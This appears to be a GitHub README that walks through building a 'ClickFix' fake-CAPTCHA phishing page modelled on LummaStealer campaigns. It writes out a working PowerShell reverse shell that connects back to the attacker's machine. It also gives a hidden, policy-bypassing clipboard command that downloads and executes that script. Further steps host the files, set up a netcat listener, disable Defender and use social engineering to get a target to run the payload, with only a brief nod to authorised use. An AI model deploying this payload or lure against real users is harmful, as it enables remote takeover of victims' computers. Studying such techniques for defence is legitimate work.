# CAPTCHA-and-Reverse-Shell
![Screenshot 2024-09-15 145147](https://github.com/user-attachments/assets/ae6fdcaf-f6e6-4ce5-8c02-967fe34965b8)

For this project, you will need a Linux VM and a Windows VM. I edited the script from [John Hammond ReCAPTCHA Phish](https://github.com/JohnHammond/recaptcha-phish) .

On [Twitter](https://x.com/_JohnHammond/status/1834292759320297534), these are called "[ClickFix](https://x.com/ex_raritas/status/1834399472371016084)", or [Emmenhtal](https://x.com/SquiblydooBlog/status/1834292295224475648), used in [LummaStealer](https://malpedia.caad.fkie.fraunhofer.de/details/win.lumma) campaigns observed by [Unit42](https://x.com/Unit42_Intel/status/1829178013423992948), [Orange Cyberdefense](https://www.orangecyberdefense.com/global/blog/cert-news/emmenhtal-a-little-known-loader-distributing-commodity-infostealers-worldwide), [Huntress](https://www.huntress.com/), and others.

Attack Vector: **Copy and Paste**

# **Prepare Your Files**

You need two key files:

1. **`index.html`**: Your CAPTCHA-like interface. (JH Github)
2. **`reverse-shell.ps1`**: The PowerShell reverse shell script.

![Screenshot 2024-09-15 152432](https://github.com/user-attachments/assets/95ccb007-db1e-4892-af2f-1cc5c5dff55c)

#### **`reverse-shell.ps1` File**:

`# PowerShell Reverse Shell Script $client = New-Object System.Net.Sockets.TcpClient('<YOUR_VM_IP>', 4444); $stream = $client.GetStream(); [byte[]]$buffer = 0..65535|%{0}; while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {     $data = (New-Object Text.UTF8Encoding).GetString($buffer, 0, $i);     $result = (iex $data 2>&1 | Out-String);     $send = ([text.encoding]::UTF8).GetBytes($result);     $stream.Write($send, 0, $send.Length); } $client.Close();`

![Screenshot 2024-09-15 145107](https://github.com/user-attachments/assets/b08ddfa8-09bb-4f44-b6dc-f1f20e4888e2)


**Edit index.html to launch reverse shell payload (JH Github)**

`powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://<YOUR_VM_IP>:8080/reverse-shell.ps1')"`;

![Screenshot 2024-09-15 144910](https://github.com/user-attachments/assets/4997e25c-fd35-4732-a97d-1c395a74bedc)


### 3. **Host Files Using Python’s Built-In HTTP Server**

1. **Install Python** (if not already installed):
    
    Most Linux distributions come with Python pre-installed. Check by running:
    
    `python3 --version`
    
    If not installed, you can install it using:
    
    `sudo apt update sudo apt install python3`
    
2. **Prepare Your Directory**:
    
    Move to the directory where your `index.html` and `reverse-shell.ps1` files are located.
    
    `cd /path/to/your/files`
    
3. **Start the Python HTTP Server**:
    
    Use Python’s built-in HTTP server to host your files. By default, it listens on port 8000, but you can choose another port if needed.
    
    `python3 -m http.server 8080`
    
4. **Verify Hosting**:
    
    Open a web browser and navigate to `http://<YOUR_VM_IP>:8080`. You should see your CAPTCHA-like page. The PowerShell script can be accessed at `http://<YOUR_VM_IP>:8080/reverse-shell.ps1`.
    
![Screenshot 2024-09-15 145729](https://github.com/user-attachments/assets/aa8c1ae0-9e0b-45fc-b19f-323f4f1d29ff)



### 4. **Testing**

1. **Open Your Browser**: Visit `http://<YOUR_VM_IP>:8080` to see your hosted CAPTCHA page.
    
2. **Verify Access**: Make sure that both the CAPTCHA page and the PowerShell script are accessible

### 5. **Set Up a Listener on Your Linux VM**

To catch the reverse shell connection from the target machine, you need to set up a listener on your Linux VM. You can use Netcat (nc) for this purpose.

1. **Install Netcat** (if not already installed):
    
    `sudo apt update sudo apt install netcat`
    
2. **Start the Netcat Listener**:
    
    Open a terminal and start a Netcat listener on the port you specified in your reverse shell script (e.g., 4444). Make sure you replace `<YOUR_VM_IP>` in your PowerShell script with your actual VM IP.
    
    `nc -lvnp 4444`
    
    This command listens on port 4444 and will display any incoming connections.
    

### 6. **Deploy the Payload (DISABLE DEFENDER)**

To get the reverse shell to connect back to your machine, you need the target to run the PowerShell command that you copied to their clipboard. Here’s a breakdown:

1. **Ensure the Target Executes the Payload**:
    
    When the target pastes and runs the command from their clipboard, it will download and execute the PowerShell script from your server. Ensure that you’ve communicated with the target in a way that gets them to execute this command. This might be done by social engineering or another method, but always remember that this should only be done in a legal context, such as a Capture The Flag (CTF) competition or with proper authorization.
    
2. **Verify the Connection**:
    
    Once the target executes the payload, you should see a connection in your Netcat terminal. You can then interact with the reverse shell by typing commands directly into the Netcat session.

   ![Screenshot 2024-09-15 145203](https://github.com/user-attachments/assets/963e1c96-e278-4967-b71a-00c0fd20c92a)

